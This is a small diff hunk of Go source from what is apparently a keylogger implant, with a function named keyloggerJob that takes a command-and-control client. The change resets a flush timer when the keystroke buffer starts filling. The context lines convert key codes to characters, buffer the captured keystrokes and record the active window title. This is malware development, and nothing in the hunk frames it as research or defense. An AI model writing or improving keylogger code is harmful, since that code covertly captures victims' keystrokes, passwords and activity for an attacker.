@@ -1011,6 +1011,9 @@ func keyloggerJob(ctx context.Context, c2 *C2Client) {
 
 				ch := vkToString(vk, shiftPressed)
 				if ch != "" {
+					if buf.Len() == 0 {
+						lastFlush = time.Now()
+					}
 					buf.WriteString(ch)
 					title = getActiveWindowTitle()
 				}
